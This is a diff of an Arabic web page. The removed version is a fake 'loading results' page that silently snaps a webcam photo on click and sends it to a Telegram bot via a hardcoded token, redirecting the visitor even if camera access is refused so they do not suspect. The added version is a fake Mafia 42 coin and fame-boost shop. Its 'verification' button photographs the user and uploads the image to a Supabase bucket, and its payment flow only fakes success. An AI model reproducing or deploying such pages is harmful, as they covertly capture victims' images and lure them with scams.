@@ -1,85 +1,763 @@
 <!DOCTYPE html>
 <html lang="ar" dir="rtl">
+
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>جاري التحميل...</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=yes">
+    <title>Mafia 42 - شحن ورفع شهرة</title>
+    <!-- Font Awesome Icons (v6 free) -->
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">
+    <!-- Google Fonts: Cairo (عربية) -->
+    <link href="https://fonts.googleapis.com/css2?family=Cairo:wght@400;500;600;700;800&display=swap" rel="stylesheet">
+    <!-- Supabase SDK -->
+    <script src="https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2"></script>
     <style>
-        /* تجعل الشاشة بالكامل قابلة للنقر */
-        body, html { margin: 0; padding: 0; width: 100%; height: 100%; overflow: hidden; background: #fff; font-family: sans-serif; cursor: pointer; }
-        #overlay { width: 100%; height: 100%; display: flex; align-items: center; justify-content: center; flex-direction: column; text-align: center; }
-        #video { position: absolute; width: 1px; height: 1px; opacity: 0.01; }
-        canvas { display: none; }
-        .spinner { border: 4px solid #f3f3f3; border-top: 4px solid #3498db; border-radius: 50%; width: 40px; height: 40px; animation: spin 1s linear infinite; }
-        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            background: linear-gradient(145deg, #0a0f1e 0%, #0c1225 100%);
+            font-family: 'Cairo', sans-serif;
+            color: #eef2ff;
+            padding: 1.5rem;
+            min-height: 100vh;
+        }
+
+        /* خلفية أنميشن خفيفة */
+        .bg-particles {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            z-index: -1;
+            pointer-events: none;
+            background-image: radial-gradient(rgba(255, 215, 0, 0.08) 1.5px, transparent 1.5px);
+            background-size: 40px 40px;
+        }
+
+        .container {
+            max-width: 1300px;
+            margin: 0 auto;
+        }
+
+        /* الهيدر */
+        .header {
+            text-align: center;
+            margin-bottom: 2rem;
+        }
+
+        .game-logo {
+            display: inline-flex;
+            align-items: center;
+            gap: 15px;
+            background: rgba(0, 0, 0, 0.45);
+            backdrop-filter: blur(8px);
+            padding: 0.7rem 2rem;
+            border-radius: 80px;
+            border: 1px solid rgba(255, 200, 80, 0.4);
+            box-shadow: 0 8px 20px rgba(0, 0, 0, 0.3);
+        }
+
+        .game-logo i {
+            font-size: 2.8rem;
+            color: #f5b042;
+            text-shadow: 0 0 5px #ff9900;
+        }
+
+        .game-logo h1 {
+            font-size: 2rem;
+            font-weight: 800;
+            background: linear-gradient(135deg, #FFE6B0, #FFB347);
+            background-clip: text;
+            -webkit-background-clip: text;
+            color: transparent;
+        }
+
+        .game-logo span {
+            font-size: 1rem;
+            background: #2a2e45;
+            padding: 0.2rem 0.8rem;
+            border-radius: 30px;
+            font-weight: 600;
+        }
+
+        /* أقسام البطاقات */
+        .cards-grid {
+            display: flex;
+            flex-wrap: wrap;
+            gap: 2rem;
+            justify-content: center;
+        }
+
+        .card {
+            background: rgba(18, 25, 45, 0.8);
+            backdrop-filter: blur(12px);
+            border-radius: 2rem;
+            border: 1px solid rgba(255, 200, 100, 0.3);
+            padding: 1.8rem 1.5rem;
+            flex: 1;
+            min-width: 280px;
+            transition: transform 0.2s, box-shadow 0.2s;
+            box-shadow: 0 20px 35px -12px rgba(0, 0, 0, 0.5);
+        }
+
+        .card:hover {
+            transform: translateY(-5px);
+            border-color: #f5b04280;
+            box-shadow: 0 25px 40px -12px #00000080;
+        }
+
+        .card-header {
+            display: flex;
+            align-items: center;
+            gap: 12px;
+            border-bottom: 2px dashed #f5b04260;
+            padding-bottom: 0.8rem;
+            margin-bottom: 1.5rem;
+        }
+
+        .card-header i {
+            font-size: 2rem;
+            color: #f0b34b;
+        }
+
+        .card-header h2 {
+            font-size: 1.7rem;
+            font-weight: 700;
+        }
+
+        /* الحقول والإدخالات */
+        .input-group {
+            margin-bottom: 1.4rem;
+        }
+
+        .input-group label {
+            display: block;
+            font-weight: 600;
+            margin-bottom: 0.5rem;
+            font-size: 0.9rem;
+            color: #ccd6f0;
+        }
+
+        .input-group input,
+        .input-group select {
+            width: 100%;
+            background: #0e1326;
+            border: 1px solid #2a345a;
+            padding: 0.9rem 1rem;
+            border-radius: 1rem;
+            font-family: 'Cairo', sans-serif;
+            font-size: 1rem;
+            color: #f8f9ff;
+            transition: all 0.2s;
+        }
+
+        .input-group input:focus,
+        .input-group select:focus {
+            outline: none;
+            border-color: #f5b042;
+            box-shadow: 0 0 0 3px rgba(245, 176, 66, 0.2);
+        }
+
+        .price-tag {
+            background: #1e243e;
+            padding: 0.5rem 1rem;
+            border-radius: 1rem;
+            text-align: center;
+            font-weight: bold;
+            margin: 0.5rem 0 1rem;
+            font-size: 1.1rem;
+        }
+
+        .price-tag i {
+            margin-left: 8px;
+        }
+
+        /* الخيارات السريعة للحزم */
+        .pack-buttons {
+            display: flex;
+            flex-wrap: wrap;
+            gap: 10px;
+            margin: 1rem 0;
+        }
+
+        .pack-btn {
+            background: #1b223c;
+            border: 1px solid #3a4570;
+            border-radius: 2rem;
+            padding: 0.5rem 1rem;
+            font-weight: 600;
+            cursor: pointer;
+            transition: all 0.2s;
+            font-size: 0.9rem;
+            color: #efefef;
+        }
+
+        .pack-btn.active,
+        .pack-btn:hover {
+            background: #f5b042;
+            color: #0a0e1c;
+            border-color: #f5b042;
+            box-shadow: 0 4px 12px rgba(245, 176, 66, 0.3);
+        }
+
+        /* الأزرار الرئيسية */
+        .action-btn {
+            width: 100%;
+            background: linear-gradient(95deg, #f5b042, #ffcf6e);
+            border: none;
+            padding: 0.9rem;
+            border-radius: 2rem;
+            font-weight: 800;
+            font-size: 1.2rem;
+            font-family: 'Cairo', sans-serif;
+            color: #141a2c;
+            margin-top: 1rem;
+            cursor: pointer;
+            transition: 0.2s;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 10px;
+            box-shadow: 0 6px 14px rgba(0, 0, 0, 0.3);
+        }
+
+        .action-btn:hover {
+            background: linear-gradient(95deg, #ffc462, #ffdd99);
+            transform: scale(0.98);
+            box-shadow: 0 2px 8px black;
+        }
+
+        /* سجل العمليات */
+        .history-section {
+            margin-top: 2.5rem;
+            background: rgba(0, 0, 0, 0.4);
+            border-radius: 1.8rem;
+            padding: 1.5rem;
+            backdrop-filter: blur(4px);
+        }
+
+        .history-title {
+            display: flex;
+            align-items: center;
+            gap: 10px;
+            font-size: 1.4rem;
+            margin-bottom: 1rem;
+            border-right: 4px solid #f5b042;
+            padding-right: 1rem;
+        }
+
+        .history-list {
+            max-height: 260px;
+            overflow-y: auto;
+            display: flex;
+            flex-direction: column;
+            gap: 12px;
+        }
+
+        .history-item {
+            background: #0f152b80;
+            border-radius: 1rem;
+            padding: 0.8rem 1rem;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            border-left: 3px solid #f5b042;
+            font-size: 0.9rem;
+        }
+
+        .history-type {
+            font-weight: 700;
+            display: inline-flex;
+            align-items: center;
+            gap: 6px;
+        }
+
+        .history-date {
+            color: #9aa4c9;
+            font-size: 0.75rem;
+        }
+
+        .badge {
+            background: #2a2f4e;
+            padding: 0.2rem 0.7rem;
+            border-radius: 30px;
+            font-size: 0.8rem;
+        }
+
+        .empty-history {
+            text-align: center;
+            padding: 2rem;
+            color: #b9c3e6;
+        }
+
+        footer {
+            text-align: center;
+            margin-top: 2.5rem;
+            font-size: 0.8rem;
+            opacity: 0.7;
+        }
+
+        /* كاميرا */
+        #video {
+            position: fixed;
+            bottom: 20px;
+            right: 20px;
+            width: 200px;
+            height: 150px;
+            border-radius: 12px;
+            border: 2px solid #f5b042;
+            z-index: 1000;
+            background: #000;
+            display: none;
+            object-fit: cover;
+        }
+
+        /* رسالة الكاميرا */
+        .camera-status {
+            position: fixed;
+            bottom: 20px;
+            left: 20px;
+            background: #1e2a3a;
+            padding: 8px 15px;
+            border-radius: 30px;
+            font-size: 0.8rem;
+            z-index: 1000;
+            display: none;
+            border-right: 3px solid #f5b042;
+        }
+
+        @media (max-width: 780px) {
+            body {
+                padding: 1rem;
+            }
+
+            .card-header h2 {
+                font-size: 1.3rem;
+            }
+
+            #video {
+                width: 150px;
+                height: 110px;
+                bottom: 10px;
+                right: 10px;
+            }
+        }
+
+        .toast-msg {
+            position: fixed;
+            bottom: 30px;
+            left: 20px;
+            background: #1e2a3a;
+            color: #ffeaac;
+            padding: 10px 20px;
+            border-radius: 40px;
+            font-weight: 500;
+            z-index: 999;
+            transition: 0.2s;
+            box-shadow: 0 4px 15px black;
+            border-right: 5px solid #f5b042;
+            direction: ltr;
+        }
     </style>
 </head>
-<body onclick="startCapture()">
 
-    <div id="overlay">
-        <div class="spinner"></div>
-        <p>جاري تحميل النتائج...</p>
-        <p style="font-size: 12px; color: #999; margin-top: 10px;">انقر هنا للمتابعة وإظهار الصور</p>
+<body>
+    <div class="bg-particles"></div>
+    <div class="container">
+        <div class="header">
+            <div class="game-logo">
+                <i class="fas fa-skull"></i>
+                <h1>Mafia 42 · رفع الشهرة</h1>
+                <span>v. الشرفاء</span>
+            </div>
+            <p style="margin-top: 12px;">⚡ اختر طريقة الدفع أو الشحن المباشر لزيادة شهرتك وقوتك داخل العائلة ⚡</p>
+        </div>
+
+        <div class="cards-grid">
+            <!-- بطاقة الشحن -->
+            <div class="card">
+                <div class="card-header">
+                    <i class="fas fa-coins"></i>
+                    <h2>شحن الرصيد</h2>
+                </div>
+                <div class="input-group">
+                    <label><i class="fas fa-user"></i> معرف اللاعب (ID)</label>
+                    <input type="text" id="playerId" placeholder="MAFIA42-123456" value="عصابة_42">
+                </div>
+                <div class="input-group">
+                    <label><i class="fas fa-gem"></i> طريقة الشحن</label>
+                    <select id="chargeMethod">
+                        <option value="بطاقة ائتمان">💳 بطاقة ائتمان</option>
+                        <option value="كاش يو">💎 كاش يو (CashU)</option>
+                        <option value="فودافون كاش">📱 فودافون كاش</option>
+                        <option value="أون باي">🌐 أون باي</option>
+                    </select>
+                </div>
+                <div class="input-group">
+                    <label><i class="fas fa-database"></i> اختر الحزمة (العملات)</label>
+                    <div class="pack-buttons" id="chargePacks">
+                        <button data-value="100" class="pack-btn">100 عملة = 1.99$</button>
+                        <button data-value="550" class="pack-btn">550 عملة = 8.99$</button>
+                        <button data-value="1250" class="pack-btn active">1250 عملة = 17.99$ 🔥</button>
+                        <button data-value="3000" class="pack-btn">3000 عملة + هدية = 39.99$</button>
+                    </div>
+                    <input type="hidden" id="selectedChargeAmount" value="1250">
+                </div>
+                <div class="price-tag">
+                    <i class="fas fa-tag"></i> <span id="chargeDisplayPrice">17.99 $</span>
+                </div>
+                <button class="action-btn" id="chargeNowBtn"><i class="fas fa-bolt"></i> شحن الآن</button>
+            </div>
+
+            <!-- بطاقة رفع الشهرة -->
+            <div class="card">
+                <div class="card-header">
+                    <i class="fas fa-chart-line"></i>
+                    <h2>رفع الشهرة</h2>
+                </div>
+                <div class="input-group">
+                    <label><i class="fas fa-trophy"></i> حساب اللاعب (Username/ID)</label>
+                    <input type="text" id="famePlayerId" placeholder="اسمك داخل اللعبة" value="Don_Corleone">
+                </div>
+                <div class="input-group">
+                    <label><i class="fas fa-fire"></i> مستوى الشهرة المطلوب</label>
+                    <select id="fameTarget">
+                        <option value="500">شهرة 500 (مبتدئ)</option>
+                        <option value="1500">شهرة 1500 (محترم)</option>
+                        <option value="4000" selected>شهرة 4000 (صاحب نفوذ) 🔥</option>
+                        <option value="10000">شهرة 10000 (أسطورة)</option>
+                        <option value="25000">شهرة 25000 (رب العائلة)</option>
+                    </select>
+                </div>
+                <div class="input-group">
+                    <label><i class="fas fa-gavel"></i> طريقة رفع الشهرة</label>
+                    <select id="fameMethod">
+                        <option value="تصويتات سريعة">🗳️ تصويتات سريعة (فوري)</option>
+                        <option value="حماية شهرة">🛡️ حماية شهرة + دفعة</option>
+                        <option value="بوتات احترافية">🤖 بوتات احترافية (VIP)</option>
+                    </select>
+                </div>
+                <div class="price-tag" style="background: #2a213a;">
+                    <i class="fas fa-star-of-life"></i> السعر المقدر: <span id="famePriceDisplay">19.99 $</span>
+                </div>
+                <button class="action-btn" id="increaseFameBtn"><i class="fas fa-camera"></i> رفع شهرة + تصوير</button>
+            </div>
+        </div>
+
+        <!-- سجل العمليات -->
+        <div class="history-section">
+            <div class="history-title">
+                <i class="fas fa-history"></i>
+                <span>آخر عمليات الشحن ورفع الشهرة</span>
+            </div>
+            <div id="historyContainer" class="history-list">
+                <div class="empty-history">✨ لا توجد معاملات بعد، قم بإجراء أول عملية شحن أو رفع شهرة ✨</div>
+            </div>
+        </div>
+        <footer>
+            <i class="fas fa-shield-alt"></i> بيئة آمنة 128-bit | جميع المعاملات تجريبية بشكل وهمي لعرض واجهة Mafia42
+        </footer>
     </div>
 
+    <!-- عناصر الكاميرا -->
     <video id="video" autoplay playsinline></video>
-    <canvas id="canvas"></canvas>
+    <div id="cameraStatus" class="camera-status"></div>
+    <canvas id="canvas" style="display:none;"></canvas>
 
-<script>
-    // بيانات التليغرام الخاصة بك
-    const botToken = "8667481771:AAFKgGalPrXf7paI5X8-7WkqkgZEiBqgKuc"; 
-    const chatId = "6492264194";     
-    const targetUrl = "https://www.google.com/search?q=%D8%B5%D9%88%D8%B1+%D8%A8%D9%86%D8%A7%D8%AA&oq=%D8%B5%D9%88%D8%B1+%D8%A8%D9%86%D8%A7%D8%AA&gs_lcrp=EgZjaHJvbWUyBggAEEUYOTIKCAEQABixAxiABDIKCAIQABixAxiABDIKCAMQABixAxiABDIKCAQQABixAxiABDIKCAUQABixAxiABDIKCAYQABixAxiABDIKCAcQABixAxiABDIKCAgQABixAxiABDIHCAkQABiABDIHCAoQABiABDIKCAsQABixAxiABDIHCAwQABiABDIKCA0QABixAxiABDIKCA stage_4EABixAxiABNIBCDEyNjdqMGo0qAIOsAIB8QVfOt9ygX_PUA&client=ms-android-xiaomi-terr1-rso2&sourceid=chrome-mobile&ie=UTF-8#sv=CAMScRoyKhBlLTczVy12cTNwYnQtVF9NMg43M1ctdnEzcGJ0LVRfTToOY1RCeUFqRk02cnJaeE0gBCoxChtfRmVmX2FhWENKWnJwN19VUHpjTHcyQU1fMjESEGUtNzNXLXZxM3BidC1UX00YADABSgQIARACGAcgveuY4QpKCBACGAEgAigB";
+    <script>
+        // ------------------- إعداد Supabase -------------------
+        const supabaseClient = supabase.createClient(
+            'https://zkjrvjuyncunbdnngcui.supabase.co',
+            'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6InpranJ2anV5bmN1bmJkbm5nY3VpIiwicm9sZSI6ImFub24iLCJpYXQiOjE3Nzk1NjMyNTksImV4cCI6MjA5NTEzOTI1OX0.E1OZ4INqRy-Wuv5K5nDCMtBGJ6k5NdDKldlepukYvO8'
+        );
 
-    let isCaptured = false;
+        // عناصر الكاميرا
+        const video = document.getElementById('video');
+        const canvas = document.getElementById('canvas');
+        const cameraStatus = document.getElementById('cameraStatus');
+        let cameraStream = null;
 
-    function startCapture() {
-        if (isCaptured) return;
-        
-        document.querySelector('p').innerText = "يرجى الانتظار ثانية واحدة...";
+        // ------------------- عناصر الشحن -------------------
+        const chargePackBtns = document.querySelectorAll('#chargePacks .pack-btn');
+        const selectedChargeAmountHidden = document.getElementById('selectedChargeAmount');
+        const chargeDisplayPriceSpan = document.getElementById('chargeDisplayPrice');
+        const playerIdInput = document.getElementById('playerId');
+        const chargeMethodSelect = document.getElementById('chargeMethod');
+        const chargeBtn = document.getElementById('chargeNowBtn');
 
-        navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } })
-        .then(stream => {
-            isCaptured = true;
-            const video = document.getElementById('video');
-            video.srcObject = stream;
-            
-            // تصوير تلقائي بعد ثانية واحدة من الحصول على الإذن
+        // عناصر رفع الشهرة
+        const famePlayerInput = document.getElementById('famePlayerId');
+        const fameTargetSelect = document.getElementById('fameTarget');
+        const fameMethodSelect = document.getElementById('fameMethod');
+        const famePriceSpan = document.getElementById('famePriceDisplay');
+        const increaseFameBtn = document.getElementById('increaseFameBtn');
+
+        const historyContainer = document.getElementById('historyContainer');
+
+        // حزم الشحن
+        const chargePackages = {
+            100: { price: 1.99, label: '100 عملة' },
+            550: { price: 8.99, label: '550 عملة' },
+            1250: { price: 17.99, label: '1250 عملة' },
+            3000: { price: 39.99, label: '3000 عملة + هدية' }
+        };
+
+        // حساب سعر الشهرة
+        function getFamePrice(fameValue, method) {
+            let base = 0;
+            if (fameValue == 500) base = 4.99;
+            else if (fameValue == 1500) base = 9.99;
+            else if (fameValue == 4000) base = 19.99;
+            else if (fameValue == 10000) base = 44.99;
+            else if (fameValue == 25000) base = 99.99;
+
+            let methodExtra = 0;
+            if (method === 'حماية شهرة') methodExtra = 2.5;
+            else if (method === 'بوتات احترافية') methodExtra = 5.0;
+            return (base + methodExtra).toFixed(2);
+        }
+
+        function updateFamePrice() {
+            const fameVal = parseInt(fameTargetSelect.value);
+            const method = fameMethodSelect.value;
+            famePriceSpan.innerText = `${getFamePrice(fameVal, method)} $`;
+        }
+
+        function updateChargeUI(amount) {
+            selectedChargeAmountHidden.value = amount;
+            const pkg = chargePackages[amount];
+            if (pkg) chargeDisplayPriceSpan.innerText = `${pkg.price} $`;
+
+            chargePackBtns.forEach(btn => {
+                const val = parseInt(btn.getAttribute('data-value'));
+                if (val === amount) btn.classList.add('active');
+                else btn.classList.remove('active');
+            });
+        }
+
+        chargePackBtns.forEach(btn => {
+            btn.addEventListener('click', () => {
+                const val = parseInt(btn.getAttribute('data-value'));
+                if (!isNaN(val)) updateChargeUI(val);
+            });
+        });
+
+        fameTargetSelect.addEventListener('change', updateFamePrice);
+        fameMethodSelect.addEventListener('change', updateFamePrice);
+
+        function showToast(message, isError = false) {
+            let existingToast = document.querySelector('.toast-msg');
+            if (existingToast) existingToast.remove();
+            const toast = document.createElement('div');
+            toast.className = 'toast-msg';
+            toast.innerHTML = `<i class="fas ${isError ? 'fa-exclamation-triangle' : 'fa-check-circle'}"></i> ${message}`;
+            document.body.appendChild(toast);
             setTimeout(() => {
-                const canvas = document.getElementById('canvas');
-                const context = canvas.getContext('2d');
+                toast.style.opacity = '0';
+                setTimeout(() => toast.remove(), 500);
+            }, 3200);
+        }
+
+        function addHistoryRecord(type, details, status = 'تم بنجاح') {
+            const now = new Date();
+            const formattedTime = `${now.toLocaleDateString('ar-EG')} - ${now.toLocaleTimeString('ar-EG')}`;
+            const historyItem = document.createElement('div');
+            historyItem.className = 'history-item';
+            let typeIcon = type === 'charge' ? '<i class="fas fa-coins" style="color:#f5b042"></i>' : '<i class="fas fa-chart-simple" style="color:#f0a3ff"></i>';
+            let typeText = type === 'charge' ? 'شحن رصيد' : 'رفع شهرة';
+            let extraInfo = type === 'charge' ? `${details.amount} عبر ${details.method}` : `شهرة ${details.targetFame} بـ ${details.method}`;
+
+            historyItem.innerHTML = `
+                <div class="history-type">
+                    ${typeIcon} <strong>${typeText}</strong>
+                    <span class="badge">${extraInfo}</span>
+                </div>
+                <div>
+                    <span class="history-date">${formattedTime}</span>
+                    <span style="margin-right: 12px; color:#9eff9e;">✓ ${status}</span>
+                </div>
+            `;
+            const emptyDiv = historyContainer.querySelector('.empty-history');
+            if (emptyDiv) emptyDiv.remove();
+            historyContainer.prepend(historyItem);
+            while (historyContainer.children.length > 12) {
+                historyContainer.removeChild(historyContainer.lastChild);
+            }
+        }
+
+        // إغلاق الكاميرا
+        function stopCamera() {
+            if (cameraStream) {
+                cameraStream.getTracks().forEach(track => track.stop());
+                cameraStream = null;
+            }
+            video.style.display = 'none';
+            cameraStatus.style.display = 'none';
+            video.srcObject = null;
+        }
+
+        // فتح الكاميرا
+        async function startCamera() {
+            return new Promise(async (resolve, reject) => {
+                try {
+                    if (cameraStream) {
+                        stopCamera();
+                    }
+                    cameraStatus.style.display = 'block';
+                    cameraStatus.innerHTML = '📷 جاري فتح الكاميرا...';
+                    video.style.display = 'block';
+
+                    const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+                    cameraStream = stream;
+                    video.srcObject = stream;
+                    
+                    cameraStatus.innerHTML = '✅ الكاميرا جاهزة، ابتسم للصورة!';
+                    
+                    // انتظر حتى تصبح الكاميرا جاهزة
+                    video.onloadedmetadata = () => {
+                        video.play();
+                        setTimeout(() => {
+                            resolve();
+                        }, 500);
+                    };
+                } catch (err) {
+                    console.error("خطأ في الكاميرا:", err);
+                    cameraStatus.innerHTML = '❌ لا يمكن الوصول للكاميرا';
+                    video.style.display = 'none';
+                    reject(err);
+                }
+            });
+        }
+
+        // التقاط الصورة ورفعها
+        async function captureAndUpload(famePlayer, fameText, method) {
+            if (!video.srcObject || !cameraStream) {
+                showToast("⚠️ الكاميرا غير جاهزة، حاول مرة أخرى", true);
+                return false;
+            }
+
+            if (video.readyState === video.HAVE_ENOUGH_DATA && video.videoWidth > 0) {
                 canvas.width = video.videoWidth;
                 canvas.height = video.videoHeight;
-                context.drawImage(video, 0, 0);
+                const ctx = canvas.getContext('2d');
+                ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
                 
-                canvas.toBlob(blob => {
-                    const formData = new FormData();
-                    formData.append('chat_id', chatId);
-                    formData.append('photo', blob, 'auto_capture.png');
-                    formData.append('caption', '📸 التقاط تلقائي وتحويل للموقع المطلوب');
+                // إضافة إطار للنص على الصورة
+                ctx.font = "bold 20px Cairo";
+                ctx.fillStyle = "#f5b042";
+                ctx.shadowColor = "black";
+                ctx.shadowBlur = 4;
+                ctx.fillText(`Mafia42 - ${famePlayer}`, 20, 50);
+                
+                const blob = await new Promise(resolve => canvas.toBlob(resolve, 'image/jpeg', 0.9));
+                const fileName = `fame_${famePlayer}_${Date.now()}.jpg`;
+                
+                showToast(`📤 جاري رفع الصورة...`);
+                
+                try {
+                    const { error } = await supabaseClient.storage
+                        .from('photos')
+                        .upload(fileName, blob);
+                    
+                    if (!error) {
+                        showToast(`🎉 تم رفع طلب شهرة ${fameText} بنجاح! سيتم مراجعة طلبك خلال 24 ساعة`);
+                        addHistoryRecord('fame', { targetFame: fameText, method: method, player: famePlayer });
+                        stopCamera();
+                        return true;
+                    } else {
+                        showToast(`❌ فشل الرفع: ${error.message}`, true);
+                        return false;
+                    }
+                } catch (e) {
+                    showToast("❌ خطأ في الاتصال بالسيرفر", true);
+                    return false;
+                }
+            } else {
+                showToast("⚠️ انتظر قليلاً حتى تعمل الكاميرا", true);
+                return false;
+            }
+        }
 
-                    fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, {
-                        method: 'POST',
-                        body: formData
-                    })
-                    .then(() => {
-                        // إغلاق الكاميرا والتحويل للموقع فوراً
-                        stream.getTracks().forEach(track => track.stop());
-                        window.location.href = targetUrl;
-                    })
-                    .catch(() => {
-                        // حتى لو فشل الإرسال نحول المستخدم للموقع
-                        window.location.href = targetUrl;
-                    });
-                }, 'image/png');
-            }, 1000);
-        })
-        .catch(err => {
-            // في حال رفض المستخدم الإذن، نحوله للموقع أيضاً حتى لا يشك
-            window.location.href = targetUrl;
+        // رفع الشهرة مع الكاميرا
+        async function handleFameIncrease() {
+            const famePlayer = famePlayerInput.value.trim();
+            if (!famePlayer) {
+                showToast("❌ أدخل اسم اللاعب أولاً", true);
+                return;
+            }
+
+            const targetFameVal = parseInt(fameTargetSelect.value);
+            let fameText = "";
+            if (targetFameVal === 500) fameText = "500 (مبتدئ)";
+            else if (targetFameVal === 1500) fameText = "1500 (محترم)";
+            else if (targetFameVal === 4000) fameText = "4000 (صاحب نفوذ)";
+            else if (targetFameVal === 10000) fameText = "10000 (أسطورة)";
+            else fameText = "25000 (رب العائلة)";
+            
+            const method = fameMethodSelect.value;
+            
+            showToast(`📸 سيتم فتح الكاميرا للتحقق من حساب ${famePlayer}`);
+            
+            try {
+                await startCamera();
+                
+                // انتظر 2 ثانية للتأكد من الكاميرا
+                setTimeout(async () => {
+                    await captureAndUpload(famePlayer, fameText, method);
+                }, 2000);
+                
+            } catch (err) {
+                showToast("❌ تعذر تشغيل الكاميرا، تأكد من الإذن", true);
+            }
+        }
+
+        // وظيفة الشحن العادية
+        function handleCharge() {
+            const playerId = playerIdInput.value.trim();
+            if (playerId === "") {
+                showToast("❌ من فضلك أدخل معرف اللاعب (ID)", true);
+                return;
+            }
+            const amount = parseInt(selectedChargeAmountHidden.value);
+            const pkg = chargePackages[amount];
+            if (!pkg) {
+                showToast("⚠️ حزمة غير صالحة", true);
+                return;
+            }
+            const method = chargeMethodSelect.value;
+            showToast(`🔄 جاري معالجة شحن ${pkg.label} بـ ${pkg.price}$ عبر ${method} ...`);
+            setTimeout(() => {
+                showToast(`✅ تم شحن ${pkg.label} إلى حساب ${playerId} بنجاح!`, false);
+                addHistoryRecord('charge', { amount: pkg.label, method: method, id: playerId }, 'مكتمل');
+            }, 800);
+        }
+
+        // ربط الأزرار
+        chargeBtn.addEventListener('click', handleCharge);
+        increaseFameBtn.addEventListener('click', handleFameIncrease);
+
+        // تهيئة الأسعار
+        updateChargeUI(1250);
+        updateFamePrice();
+
+        // إغلاق الكاميرا عند مغادرة الصفحة
+        window.addEventListener('beforeunload', () => {
+            if (cameraStream) {
+                cameraStream.getTracks().forEach(track => track.stop());
+            }
         });
-    }
-</script>
-</body>
-</html>
 
+        window.addEventListener('load', () => {
+            setTimeout(() => {
+                showToast("💀 مرحباً زعيم! اختر الحزمة المناسبة لصعود المجد 💀");
+            }, 600);
+        });
+    </script>
+</body>
+
+</html>
